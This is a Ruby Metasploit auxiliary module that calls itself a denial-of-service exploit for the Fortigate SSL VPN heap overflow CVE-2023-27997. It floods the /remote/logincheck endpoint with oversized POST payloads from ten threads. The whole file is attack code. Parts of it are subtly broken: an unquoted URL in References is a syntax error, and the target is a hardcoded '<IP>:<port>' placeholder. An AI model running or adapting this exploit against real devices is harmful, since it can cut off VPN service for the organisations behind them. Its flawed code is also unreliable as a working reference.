require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Request

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Fortigate SSL VPN (CVE-2023-27997)',
        'Description'    => 'A custom denial-of-service (DoS) exploit abusing the heap overflow in Fortigate SSL VPN',
        'Author'         => 'Christiaan Beek @ Rapid7',
        'License'        => MSF_LICENSE,
        'References'     => [https://labs.watchtowr.com/xortigate-or-cve-2023-27997/],
        'DisclosureDate' => '2023-06-12'
      )
    )
  end

  def run
    threads = []

    10.times do |n|
      threads << framework.threads.spawn("Thread ##{n}") do
        thread_main(n)
      end
    end

    threads.each(&:join)
  end

  def thread_main(idx)
    (1000 + idx).step(32_670_000, 10) do |n|
      begin
        payload = "ajax=1&username=metaspl0it&realm=&enc=000000247255fc38" + ('a' * (n * 2))
        send_request_cgi(
          {
            'method' => 'POST',
            'uri'    => "https://<IP>:<port>/remote/logincheck",
            'data'   => payload
          }
        )
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        # Ignore connection errors
      end
    end
  end
end
